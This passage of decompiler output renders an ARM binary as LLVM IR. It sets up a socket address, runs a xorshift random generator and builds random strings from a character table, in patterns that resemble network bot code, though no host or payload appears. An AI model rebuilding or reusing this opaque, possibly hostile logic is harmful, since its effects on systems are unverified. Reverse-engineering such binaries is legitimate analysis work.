  %v0_ed5c = call i32 @function_1273c()
  store i32 ptrtoint (i16** @global_var_233a0.117 to i32), i32* @ip, align 4
  store i32 1370272094, i32* @global_var_233a4.118, align 4
  store i32 2, i32* @lr, align 4
  store i32 20480, i32* @r3, align 4
  %v2_ed7c = ptrtoint i8* %stack_var_-118 to i32
  store i32 %v0_ed5c, i32* @global_var_23394.88, align 4
  store i16 20480, i16* bitcast (i32* @global_var_233a2.119 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_233a0.117 to i16*), align 4
  store i32 ptrtoint ([3 x i8]* @global_var_185b4.128 to i32), i32* @r1, align 4
  store i32 18, i32* @r2, align 4
  store i32 %v2_ed7c, i32* @r0, align 4
  %v0_ed98 = load i32, i32* @sl, align 4
  %v1_ed98 = inttoptr i32 %v0_ed98 to i32*
  %v2_ed98 = load i32, i32* %v1_ed98, align 4
  store i32 %v2_ed98, i32* @r8, align 4
  %v0_ed9c = call i32 @function_13680()
  store i32 ptrtoint (i32* @global_var_185b0.140 to i32), i32* @r4, align 4
  %v13_edbc = ptrtoint i32* %stack_var_-188 to i32
  store i32 %v13_edbc, i32* @lr, align 4
  store i32 60084, i32* %stack_var_-188, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_11b48.135 to i32), i32 428976), i32 0), label %dec_label_pc_ee04, label %dec_label_pc_ef14

dec_label_pc_ee04:                                ; preds = %dec_label_pc_ed54, %dec_label_pc_ef14, %dec_label_pc_f0c0
  %v2_ee08 = ptrtoint i32* %stack_var_-182 to i32
  store i32 %v2_ee08, i32* @fp, align 4
  %v0_ee0c = call i32 @function_eacc()
  %v1_ee10 = call i32 @function_f75c(i32 %v0_ee0c)
  %v2_ee1c = call i32 @function_12514(i32 %v2_ee08, i32 32)
  %v0_ee20 = load i32, i32* @sb, align 4
  %v7_ee20 = icmp eq i32 %v0_ee20, 2
  br i1 %v7_ee20, label %dec_label_pc_f0e8, label %dec_label_pc_ee28

dec_label_pc_ee28:                                ; preds = %dec_label_pc_ee04, %dec_label_pc_f0e8, %dec_label_pc_f0f8
  %v0_ee28 = call i32 @function_f700()
  %v1_ee2c = mul i32 %v0_ee28, 4
  %v3_ee30 = and i32 %v1_ee2c, 12
  %v2_ee38 = ptrtoint i32* %stack_var_-150 to i32
  store i32 %v2_ee38, i32* @r5, align 4
  %v1_ee3c = add nuw nsw i32 %v3_ee30, 12
  store i32 %v1_ee3c, i32* @r4, align 4
  %v2_ee48 = bitcast i32* %stack_var_-150 to i8*
  %v3_ee48 = call i32 @function_f7c4(i8* %v2_ee48, i32 %v1_ee3c)
  %v2_ee50 = ptrtoint i32* %stack_var_-40 to i32
  %v1_ee54 = load i32, i32* @r4, align 4
  %v2_ee54 = add i32 %v1_ee54, %v2_ee50
  store i32 0, i32* @r6, align 4
  %v0_ee60 = load i32, i32* @sl, align 4
  %v1_ee60 = inttoptr i32 %v0_ee60 to i32*
  %v2_ee60 = load i32, i32* %v1_ee60, align 4
  store i32 %v2_ee60, i32* @r0, align 4
  %v3_ee64 = add i32 %v2_ee54, -110
  %v4_ee64 = inttoptr i32 %v3_ee64 to i8*
  store i8 0, i8* %v4_ee64, align 1
  %v2_ee68 = inttoptr i32 %v2_ee60 to i8*
  %v3_ee68 = call i32 @function_124a8(i8* %v2_ee68, i32 %v2_ee38)
  %v0_ee6c = call i32 @function_f700()
  store i32 0, i32* @r3, align 4
  %v3_ee88 = mul i32 %v0_ee6c, 4
  %v1_ee8c = add i32 %v3_ee88, 12
  store i32 %v1_ee8c, i32* @r4, align 4
  %v3_ee98 = call i32 @function_f7c4(i8* %v2_ee48, i32 %v1_ee8c)
  %v1_eea4 = load i32, i32* @r4, align 4
  %v2_eea4 = add i32 %v1_eea4, %v2_ee50
  %v0_eea8 = load i32, i32* @r6, align 4
  %v1_eea8 = trunc i32 %v0_eea8 to i8
  %v3_eea8 = add i32 %v2_eea4, -110
  %v4_eea8 = inttoptr i32 %v3_eea8 to i8*
  store i8 %v1_eea8, i8* %v4_eea8, align 1
  %v4_eeb4 = call i32 @function_12dc8(i32 15, i32 %v2_ee38, i32 %v2_ee50, i32 %v2_eea4)
  %v1_eebc = call i32 @function_11be8(i32 2)
  %v3_eec8 = call i32 @function_11b24(i32 2, i32* nonnull %stack_var_-48)
  %v2_eed8 = call i32 @function_13058(i32 1, i32 %v3_eec8)
  %v2_eee8 = call i32 @function_13058(i32 1, i32 ptrtoint (i32* @global_var_18584.143 to i32))
  %v1_eef0 = call i32 @function_11b48(i32 2)
  store i32 %v1_eef0, i32* @r0, align 4
  %v0_eef4 = call i32 @function_12e08()
  %v1_eef8 = load i32, i32* @r6, align 4
  store i32 %v6_ecb4, i32* %r5.global-to-local, align 4
  store i32 %v9_ecb4, i32* %r6.global-to-local, align 4
  ret i32 %v1_eef8

dec_label_pc_ef14:                                ; preds = %dec_label_pc_ed54
  %v0_ef1c = load i32, i32* @r8, align 4
  %v1_ef28 = inttoptr i32 %v0_ef1c to i8*
  %v2_ef28 = call i32 @function_12480(i8* %v1_ef28)
  %v2_ef34 = call i32 @function_12cb0(i32 2, i32 %v2_ef28)
  %v0_ef40 = load i32, i32* @r8, align 4
  %v2_ef44 = add i32 %v0_ef40, %v2_ef28
  %v3_ef44 = inttoptr i32 %v2_ef44 to i8*
  %v4_ef44 = load i8, i8* %v3_ef44, align 1
  %v6_ef44 = zext i8 %v4_ef44 to i32
  store i32 %v6_ef44, i32* @r4, align 4
  %v1_ef50 = inttoptr i32 %v0_ef40 to i8*
  %v2_ef50 = call i32 @function_12480(i8* %v1_ef50)
  %v2_ef5c = call i32 @function_12cb0(i32 4, i32 %v2_ef50)
  %v0_ef68 = load i32, i32* @r8, align 4
  %v2_ef6c = add i32 %v0_ef68, %v2_ef50
  %v3_ef6c = inttoptr i32 %v2_ef6c to i8*
  %v4_ef6c = load i8, i8* %v3_ef6c, align 1
  %v6_ef6c = zext i8 %v4_ef6c to i32
  store i32 %v6_ef6c, i32* @r7, align 4
  %v1_ef78 = inttoptr i32 %v0_ef68 to i8*
  %v2_ef78 = call i32 @function_12480(i8* %v1_ef78)
  %v2_ef84 = call i32 @function_12cb0(i32 6, i32 %v2_ef78)
  %v0_ef90 = load i32, i32* @r8, align 4
  %v2_ef94 = add i32 %v0_ef90, %v2_ef78
  %v3_ef94 = inttoptr i32 %v2_ef94 to i8*
  %v4_ef94 = load i8, i8* %v3_ef94, align 1
  %v6_ef94 = zext i8 %v4_ef94 to i32
  store i32 %v6_ef94, i32* %r6.global-to-local, align 4
  %v1_efa0 = inttoptr i32 %v0_ef90 to i8*
  %v2_efa0 = call i32 @function_12480(i8* %v1_efa0)
  %v2_efac = call i32 @function_12cb0(i32 8, i32 %v2_efa0)
  %v0_efb8 = load i32, i32* @r8, align 4
  %v2_efbc = add i32 %v0_efb8, %v2_efa0
  %v3_efbc = inttoptr i32 %v2_efbc to i8*
  %v4_efbc = load i8, i8* %v3_efbc, align 1
  %v6_efbc = zext i8 %v4_efbc to i32
  store i32 %v6_efbc, i32* %r5.global-to-local, align 4
  %v1_efc8 = inttoptr i32 %v0_efb8 to i8*
  %v2_efc8 = call i32 @function_12480(i8* %v1_efc8)
  %v2_efd4 = call i32 @function_12cb0(i32 10, i32 %v2_efc8)
  %v0_efd8 = load i32, i32* @r4, align 4
  %v1_efd8 = urem i32 %v0_efd8, 256
  %v0_efe0 = load i32, i32* @r7, align 4
  %v1_efe0 = urem i32 %v0_efe0, 256
  %v1_efe4 = xor i32 %v1_efe0, 255
  store i32 %v1_efe4, i32* @r7, align 4
  %v0_efe8 = load i32, i32* %r6.global-to-local, align 4
  %v1_efec = sub nsw i32 174, %v1_efd8
  %v1_efe8 = urem i32 %v0_efe8, 256
  %v1_eff0 = xor i32 %v1_efe8, 255
  store i32 %v1_eff0, i32* @r6, align 4
  %v0_eff4 = load i32, i32* %r5.global-to-local, align 4
  %v1_eff4 = sub i32 -1, %v0_eff4
  store i32 %v1_eff4, i32* %r5.global-to-local, align 4
  %v2_eff8 = add nsw i32 %v1_efe4, %v1_efec
  %v0_effc = load i32, i32* @r8, align 4
  %v2_effc = add i32 %v0_effc, %v2_efc8
  %v3_effc = inttoptr i32 %v2_effc to i8*
  %v4_effc = load i8, i8* %v3_effc, align 1
  %v6_effc = zext i8 %v4_effc to i32
  %v1_f000 = urem i32 %v1_eff4, 256
  store i32 %v1_f000, i32* %r5.global-to-local, align 4
  %v2_f004 = add nsw i32 %v1_eff0, %v2_eff8
  %v1_f014 = sub nuw nsw i32 -1, %v6_effc
  %fold15 = add i32 %v2_f004, %v1_eff4
  %v1_f018 = urem i32 %fold15, 256
  %v2_f020 = add nsw i32 %v1_f018, %v1_f014
  store i32 %v2_f020, i32* @r4, align 4
  %v1_f02c = inttoptr i32 %v0_effc to i8*
  %v2_f02c = call i32 @function_12480(i8* %v1_f02c)
  %v2_f038 = call i32 @function_12cb0(i32 12, i32 %v2_f02c)
  %v0_f03c = load i32, i32* @r8, align 4
  %v2_f03c = add i32 %v0_f03c, %v2_f02c
  %v3_f03c = inttoptr i32 %v2_f03c to i8*
  %v4_f03c = load i8, i8* %v3_f03c, align 1
  %v6_f03c = zext i8 %v4_f03c to i32
  %v0_f040 = load i32, i32* @r4, align 4
  %v1_f044 = sub nuw nsw i32 -1, %v6_f03c
  %fold = add i32 %v0_f040, %v1_f044
  %v1_f050 = urem i32 %fold, 256
  %v3_f058 = udiv i32 %v1_f050, 9
  %v2_f064 = sub i32 %fold, %v3_f058
  %v2_f070 = ptrtoint i32* %stack_var_-40 to i32
  %v1_f068 = mul i32 %v2_f064, 4
  %v3_f074 = and i32 %v1_f068, 1020
  %v2_f07c = add i32 %v3_f074, %v2_f070
  %v2_f080 = ptrtoint i8* %stack_var_-84 to i32
  store i32 %v2_f080, i32* @r5, align 4
  %v1_f084 = add i32 %v2_f07c, -180
  %v2_f084 = inttoptr i32 %v1_f084 to i32*
  %v3_f084 = load i32, i32* %v2_f084, align 4
  store i32 61584, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_f084)
  %v0_f094 = load i32, i32* @r8, align 4
  %v2_f098 = inttoptr i32 %v0_f094 to i8*
  %v3_f098 = call i32 @function_12860(i8* %v2_f098, i32 %v2_f080)
  store i32 %v3_f098, i32* @r4, align 4
  %v2_f0a8 = call i32 @function_12514(i32 %v2_ed7c, i32 18)
  %v2_f0b4 = call i32 @function_12514(i32 %v2_f080, i32 12)
  %v0_f0b8 = load i32, i32* @r4, align 4
  %v2_f0b8 = icmp eq i32 %v0_f0b8, 0
  br i1 %v2_f0b8, label %dec_label_pc_ee04, label %dec_label_pc_f0c0

dec_label_pc_f0c0:                                ; preds = %dec_label_pc_ef14
  %v1_f0c4 = call i32 @function_13978(i32 5)
  br label %dec_label_pc_ee04

dec_label_pc_f0cc:                                ; preds = %dec_label_pc_ecb4
  %v3_f0d4 = call i32 @function_12d24(i32 ptrtoint ([19 x i8]* @global_var_18570.146 to i32), i32 2)
  %v3_f0d8 = icmp eq i32 %v3_f0d4, -1
  store i32 %v3_f0d4, i32* @r4, align 4
  br i1 %v3_f0d8, label %dec_label_pc_ed54, label %dec_label_pc_ed28

dec_label_pc_f0e8:                                ; preds = %dec_label_pc_ee04
  %v0_f0e8 = load i32, i32* @sl, align 4
  %v1_f0e8 = add i32 %v0_f0e8, 4
  %v2_f0e8 = inttoptr i32 %v1_f0e8 to i32*
  %v3_f0e8 = load i32, i32* %v2_f0e8, align 4
  %v1_f0ec = inttoptr i32 %v3_f0e8 to i8*
  %v2_f0ec = call i32 @function_12480(i8* %v1_f0ec)
  %v8_f0f4 = icmp sgt i32 %v2_f0ec, 31
  br i1 %v8_f0f4, label %dec_label_pc_ee28, label %dec_label_pc_f0f8

dec_label_pc_f0f8:                                ; preds = %dec_label_pc_f0e8
  %v0_f0f8 = load i32, i32* @sl, align 4
  %v1_f0f8 = add i32 %v0_f0f8, 4
  %v2_f0f8 = inttoptr i32 %v1_f0f8 to i32*
  %v3_f0f8 = load i32, i32* %v2_f0f8, align 4
  store i32 %v2_ee08, i32* @r0, align 4
  %v2_f100 = bitcast i32* %stack_var_-182 to i8*
  %v3_f100 = call i32 @function_124a8(i8* %v2_f100, i32 %v3_f0f8)
  %v0_f104 = load i32, i32* @sl, align 4
  %v1_f104 = add i32 %v0_f104, 4
  %v2_f104 = inttoptr i32 %v1_f104 to i32*
  %v3_f104 = load i32, i32* %v2_f104, align 4
  %v1_f10c = inttoptr i32 %v3_f104 to i8*
  %v2_f10c = call i32 @function_12480(i8* %v1_f10c)
  %v2_f118 = call i32 @function_12514(i32 %v3_f104, i32 %v2_f10c)
  br label %dec_label_pc_ee28

; uselistorder directives
  uselistorder i32 %v3_f0d4, { 1, 2, 0 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32 %v0_effc, { 1, 0 }
  uselistorder i32 %v1_eff4, { 2, 0, 1 }
  uselistorder i32 %v0_efb8, { 1, 0 }
  uselistorder i32 %v0_ef90, { 1, 0 }
  uselistorder i32 %v0_ef68, { 1, 0 }
  uselistorder i32 %v0_ef40, { 1, 0 }
  uselistorder i32 %v2_ee50, { 2, 0, 1 }
  uselistorder i32 %v2_ee38, { 1, 0, 2 }
  uselistorder i32 %v3_ed18, { 1, 2, 0 }
  uselistorder i32 %v2_ecc0, { 0, 2, 1, 3 }
  uselistorder i32 (i8*, i32)* @function_12860, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32, i32)* @function_12cb0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @function_124a8, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25, 28, 26, 29, 27, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 62, 63, 64, 65, 66, 67, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 ()* @function_eacc, { 1, 0 }
  uselistorder i32 ptrtoint (i16** @global_var_233a0.117 to i32), { 1, 0 }
  uselistorder i32 (i32, i32)* @function_139ec, { 1, 0 }
  uselistorder i32 (i32)* @function_12cf0, { 1, 0 }
  uselistorder label %dec_label_pc_ee28, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ee04, { 2, 1, 0 }
}

define i32 @function_f6e4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f6e4:
  %cpsr_c.global-to-local = alloca i1, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v0_f6e4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f6e4, label %bb, label %dec_label_pc_f6e4..thread1_crit_edge

dec_label_pc_f6e4..thread1_crit_edge:             ; preds = %dec_label_pc_f6e4
  %v0_f6f0.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %.thread1

bb:                                               ; preds = %dec_label_pc_f6e4
  %v2_f6e8 = load i32, i32* @r8, align 4
  %v4_f6ec = add i32 %arg2, -1
  %v5_f6ec = lshr i32 -2147483648, %v4_f6ec
  %v6_f6ec = and i32 %v2_f6e8, %v5_f6ec
  %v7_f6ec = icmp ne i32 %v6_f6ec, 0
  store i1 %v7_f6ec, i1* %cpsr_c.global-to-local, align 1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_f6e4..thread1_crit_edge, %bb
  %v0_f6f0 = phi i1 [ %v0_f6f0.pre, %dec_label_pc_f6e4..thread1_crit_edge ], [ %v7_f6ec, %bb ]
  call void @__pseudo_cond_branch(i1 %v0_f6f0, i32 -22306396)
  %v0_f6f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f6f4, label %bb4, label %.thread2

bb4:                                              ; preds = %.thread1
  %v2_f6fc = load i32, i32* @r8, align 4
  %v3_f6fc = and i32 %v2_f6fc, 2097152
  %v4_f6fc = icmp ne i32 %v3_f6fc, 0
  store i1 %v4_f6fc, i1* %cpsr_c.global-to-local, align 1
  br label %.thread2

.thread2:                                         ; preds = %.thread1, %bb4
  %v7_f6fc = load i32, i32* @r0, align 4
  ret i32 %v7_f6fc

; uselistorder directives
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_f700() local_unnamed_addr {
dec_label_pc_f700:
  %v2_f70c = load i32, i32* @global_var_2131c.157, align 4
  %v2_f710 = load i32, i32* @global_var_21328.159, align 4
  %v4_f71c = mul i32 %v2_f70c, 2048
  %v5_f71c = xor i32 %v4_f71c, %v2_f70c
  store i32 %v5_f71c, i32* @r3, align 4
  %v4_f720 = udiv i32 %v2_f710, 524288
  %v5_f720 = xor i32 %v4_f720, %v2_f710
  %v2_f724 = load i32, i32* @global_var_21320.161, align 4
  %v2_f728 = load i32, i32* @global_var_21324.163, align 4
  store i32 %v2_f728, i32* @ip, align 4
  %v2_f72c = xor i32 %v5_f720, %v5_f71c
  %v4_f730 = udiv i32 %v5_f71c, 256
  %v5_f730 = xor i32 %v2_f72c, %v4_f730
  store i32 %v2_f724, i32* @global_var_2131c.157, align 4
  store i32 %v2_f728, i32* @global_var_21320.161, align 4
  store i32 %v2_f710, i32* @global_var_21324.163, align 4
  store i32 %v5_f730, i32* @global_var_21328.159, align 4
  ret i32 %v5_f730

; uselistorder directives
  uselistorder i32 %v2_f710, { 2, 1, 0 }
  uselistorder i32 %v2_f70c, { 1, 0 }
}

define i32 @function_f75c(i32 %arg1) local_unnamed_addr {
dec_label_pc_f75c:
  %v2_f768 = call i32 @function_12d98(i32* null)
  store i32 %v2_f768, i32* @r0, align 4
  store i32 %v2_f768, i32* @global_var_2131c.157, align 4
  %v0_f774 = call i32 @function_12d84()
  store i32 %v0_f774, i32* @r0, align 4
  %v0_f77c = call i32 @function_12cdc()
  %v2_f784 = xor i32 %v0_f774, %v0_f77c
  store i32 %v2_f784, i32* @global_var_21320.161, align 4
  %v1_f78c = call i32 @function_13590(i32 %v2_f784)
  %v2_f790 = load i32, i32* @global_var_21320.161, align 4
  %v2_f79c = xor i32 %v2_f790, %v1_f78c
  store i32 %v2_f79c, i32* @global_var_21328.159, align 4
  store i32 %v1_f78c, i32* @global_var_21324.163, align 4
  ret i32 %v1_f78c

; uselistorder directives
  uselistorder i32 %v1_f78c, { 1, 2, 0 }
  uselistorder i32 ()* @function_12cdc, { 1, 2, 0 }
}

define i32 @function_f7c4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f7c4:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_185c8.169 to i32), i32* @r1, align 4
  %v2_f7d8 = ptrtoint i32* %stack_var_-73 to i32
  store i32 %v2_f7d8, i32* @r0, align 4
  store i32 33, i32* @r2, align 4
  %v0_f7e0 = call i32 @function_13680()
  store i32 %v0_f7e0, i32* %r0.global-to-local, align 4
  %v0_f7e4 = load i32, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f7e4 = icmp slt i32 %v0_f7e4, 0
  store i1 %v1_f7e4, i1* %cpsr_n.global-to-local, align 1
  %v2_f7e4 = icmp eq i32 %v0_f7e4, 0
  store i1 %v2_f7e4, i1* %cpsr_z.global-to-local, align 1
  %tmp24 = icmp slt i32 %v0_f7e4, 1
  br i1 %tmp24, label %dec_label_pc_f8dc, label %dec_label_pc_f7ec

dec_label_pc_f7ec:                                ; preds = %dec_label_pc_f7c4
  store i32 ptrtoint (i32* @global_var_21328.159 to i32), i32* %fp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21324.163 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21320.161 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2131c.157 to i32), i32* %r3.global-to-local, align 4
  %v2_f7fc = load i32, i32* @global_var_21328.159, align 4
  store i32 %v2_f7fc, i32* %r5.global-to-local, align 4
  %v2_f800 = load i32, i32* @global_var_21324.163, align 4
  store i32 %v2_f800, i32* %sb.global-to-local, align 4
  %v2_f804 = load i32, i32* @global_var_21320.161, align 4
  store i32 %v2_f804, i32* %sl.global-to-local, align 4
  %v2_f808 = load i32, i32* @global_var_2131c.157, align 4
  store i32 %v2_f808, i32* %r0.global-to-local, align 4
  %v2_f814 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_f878

dec_label_pc_f810:                                ; preds = %dec_label_pc_f878
  %v1_f810 = urem i32 %v5_f888, 256
  store i32 %v1_f810, i32* %r3.global-to-local, align 4
  store i32 %v2_f814, i32* %r1.global-to-local, align 4
  %v4_f818 = udiv i32 %v1_f810, 8
  %v5_f818 = add i32 %v4_f818, %v2_f814
  store i32 %v5_f818, i32* %r2.global-to-local, align 4
  %v1_f81c = add i32 %v5_f818, -33
  %v2_f81c = inttoptr i32 %v1_f81c to i8*
  %v3_f81c = load i8, i8* %v2_f81c, align 1
  %v4_f81c = zext i8 %v3_f81c to i32
  store i32 %v4_f81c, i32* %r0.global-to-local, align 4
  %v3_f820 = mul i32 %v5_f888, 65536
  store i32 %v3_f820, i32* %r1.global-to-local, align 4
  store i32 %v2_f814, i32* %r2.global-to-local, align 4
  %tmp25 = udiv i32 %v5_f888, 2048
  %v4_f828 = urem i32 %tmp25, 32
  %v5_f828 = add i32 %v4_f828, %v2_f814
  store i32 %v5_f828, i32* %r3.global-to-local, align 4
  %v1_f82c = add i32 %v5_f828, -33
  %v2_f82c = inttoptr i32 %v1_f82c to i8*
  %v3_f82c = load i8, i8* %v2_f82c, align 1
  %v4_f82c = zext i8 %v3_f82c to i32
  store i32 %v4_f82c, i32* %ip.global-to-local, align 4
  %v3_f830 = mul i32 %v5_f888, 256
  store i32 %v3_f830, i32* %r2.global-to-local, align 4
  %v3_f834 = inttoptr i32 %v0_f88c to i8*
  store i8 %v3_f81c, i8* %v3_f834, align 1
  %v4_f834 = load i32, i32* %r6.global-to-local, align 4
  %v5_f834 = add i32 %v4_f834, 1
  store i32 %v5_f834, i32* %r6.global-to-local, align 4
  %v1_f83c = load i32, i32* %r2.global-to-local, align 4
  %v4_f83c = udiv i32 %v1_f83c, 134217728
  %v5_f83c = add i32 %v4_f83c, %v2_f814
  store i32 %v5_f83c, i32* %r1.global-to-local, align 4
  %v1_f840 = load i32, i32* %r4.global-to-local, align 4
  %v4_f840 = udiv i32 %v1_f840, 134217728
  %v5_f840 = add i32 %v4_f840, %v2_f814
  store i32 %v5_f840, i32* %r3.global-to-local, align 4
  %v1_f844 = add i32 %v5_f83c, -33
  %v2_f844 = inttoptr i32 %v1_f844 to i8*
  %v3_f844 = load i8, i8* %v2_f844, align 1
  %v4_f844 = zext i8 %v3_f844 to i32
  store i32 %v4_f844, i32* %lr.global-to-local, align 4
  %v1_f848 = add i32 %v5_f840, -33
  %v2_f848 = inttoptr i32 %v1_f848 to i8*
  %v3_f848 = load i8, i8* %v2_f848, align 1
  %v4_f848 = zext i8 %v3_f848 to i32
  store i32 %v4_f848, i32* %r2.global-to-local, align 4
  %v0_f84c = load i32, i32* %r7.global-to-local, align 4
  %v1_f84c = add i32 %v0_f84c, -4
  store i32 %v1_f84c, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f850 = icmp slt i32 %v1_f84c, 0
  store i1 %v1_f850, i1* %cpsr_n.global-to-local, align 1
  %v2_f850 = icmp eq i32 %v1_f84c, 0
  store i1 %v2_f850, i1* %cpsr_z.global-to-local, align 1
  %v0_f854 = load i32, i32* %ip.global-to-local, align 4
  %v1_f854 = trunc i32 %v0_f854 to i8
  %v2_f854 = load i32, i32* %r8.global-to-local, align 4
  %v3_f854 = add i32 %v2_f854, 1
  %v4_f854 = inttoptr i32 %v3_f854 to i8*
  store i8 %v1_f854, i8* %v4_f854, align 1
  %v0_f858 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_f858, i32* %r0.global-to-local, align 4
  %v0_f85c = load i32, i32* %r8.global-to-local, align 4
  %v1_f85c = add i32 %v0_f85c, 4
  store i32 %v1_f85c, i32* %r8.global-to-local, align 4
  %v0_f860 = load i32, i32* %r2.global-to-local, align 4
  %v1_f860 = trunc i32 %v0_f860 to i8
  %v2_f860 = load i32, i32* %r6.global-to-local, align 4
  %v3_f860 = add i32 %v2_f860, 2
  %v4_f860 = inttoptr i32 %v3_f860 to i8*
  store i8 %v1_f860, i8* %v4_f860, align 1
  %v0_f864 = load i32, i32* %lr.global-to-local, align 4
  %v1_f864 = trunc i32 %v0_f864 to i8
  %v2_f864 = load i32, i32* %r6.global-to-local, align 4
  %v3_f864 = add i32 %v2_f864, 1
  %v4_f864 = inttoptr i32 %v3_f864 to i8*
  store i8 %v1_f864, i8* %v4_f864, align 1
  %v0_f868 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f868 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_f868 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_f868 = xor i1 %v1_f868, %v2_f868
  %v4_f868 = or i1 %v0_f868, %v3_f868
  br i1 %v4_f868, label %dec_label_pc_f8c0, label %dec_label_pc_f810.dec_label_pc_f86c_crit_edge

dec_label_pc_f810.dec_label_pc_f86c_crit_edge:    ; preds = %dec_label_pc_f810
  %v0_f878.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f86c

dec_label_pc_f86c:                                ; preds = %dec_label_pc_f810.dec_label_pc_f86c_crit_edge, %dec_label_pc_f894
  %v0_f878.pre = phi i32 [ %v0_f878.pre.pre, %dec_label_pc_f810.dec_label_pc_f86c_crit_edge ], [ %v0_f8b8, %dec_label_pc_f894 ]
  %v0_f86c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f86c, i32* %sl.global-to-local, align 4
  %v0_f870 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_f870, i32* %sb.global-to-local, align 4
  %v0_f874 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f874, i32* %r5.global-to-local, align 4
  %v0_f884.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f878

dec_label_pc_f878:                                ; preds = %dec_label_pc_f7ec, %dec_label_pc_f86c
  %v0_f8a8 = phi i32 [ %v0_f7e4, %dec_label_pc_f7ec ], [ %v0_f884.pre, %dec_label_pc_f86c ]
  %v0_f87c = phi i32 [ %v2_f7fc, %dec_label_pc_f7ec ], [ %v0_f874, %dec_label_pc_f86c ]
  %v0_f878 = phi i32 [ %v2_f808, %dec_label_pc_f7ec ], [ %v0_f878.pre, %dec_label_pc_f86c ]
  %v4_f878 = mul i32 %v0_f878, 2048
  %v5_f878 = xor i32 %v4_f878, %v0_f878
  store i32 %v5_f878, i32* %r3.global-to-local, align 4
  %v4_f87c = udiv i32 %v0_f87c, 524288
  %v5_f87c = xor i32 %v4_f87c, %v0_f87c
  %v2_f880 = xor i32 %v5_f87c, %v5_f878
  store i32 %v2_f880, i32* %r2.global-to-local, align 4
  %v1_f884 = add i32 %v0_f8a8, -3
  %v3_f884 = sub i32 2, %v0_f8a8
  %v4_f884 = and i32 %v3_f884, %v0_f8a8
  %v5_f884 = icmp slt i32 %v4_f884, 0
  store i1 %v5_f884, i1* %cpsr_v.global-to-local, align 1
  %v6_f884 = icmp slt i32 %v1_f884, 0
  store i1 %v6_f884, i1* %cpsr_n.global-to-local, align 1
  %v7_f884 = icmp eq i32 %v0_f8a8, 3
  store i1 %v7_f884, i1* %cpsr_z.global-to-local, align 1
  %v2_f888 = and i32 %v0_f878, 128
  %v3_f888 = icmp ne i32 %v2_f888, 0
  %v4_f888 = udiv i32 %v5_f878, 256
  %v5_f888 = xor i32 %v4_f888, %v2_f880
  store i32 %v5_f888, i32* %r4.global-to-local, align 4
  %v0_f88c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_f88c, i32* %r6.global-to-local, align 4
  %v2_f890 = xor i1 %v7_f884, true
  %v3_f890 = and i1 %v3_f888, %v2_f890
  br i1 %v3_f890, label %dec_label_pc_f810, label %dec_label_pc_f894

dec_label_pc_f894:                                ; preds = %dec_label_pc_f878
  %v1_f8a8 = add i32 %v0_f8a8, -1
  store i32 %v1_f8a8, i32* %r7.global-to-local, align 4
  %v2_f8a4.neg = urem i32 %v5_f888, 33
  store i32 %v2_f8a4.neg, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f8b0 = icmp slt i32 %v1_f8a8, 0
  store i1 %v1_f8b0, i1* %cpsr_n.global-to-local, align 1
